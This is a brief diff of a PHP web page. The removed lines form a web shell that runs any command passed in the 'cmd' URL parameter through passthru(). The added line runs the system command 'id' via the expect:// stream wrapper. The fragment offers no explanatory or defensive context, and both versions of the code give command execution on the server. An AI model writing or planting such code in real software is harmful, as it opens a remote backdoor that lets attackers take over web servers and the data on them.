@@ -6,10 +6,8 @@
 </form>
 <pre>
 <?php
-    if(isset($_GET['cmd']))
-    {
-        passthru($_GET['cmd'] . ' 2>&1');
-    }
+   file_get_contents("expect://id");
+
 ?>
 </pre>
 </body>
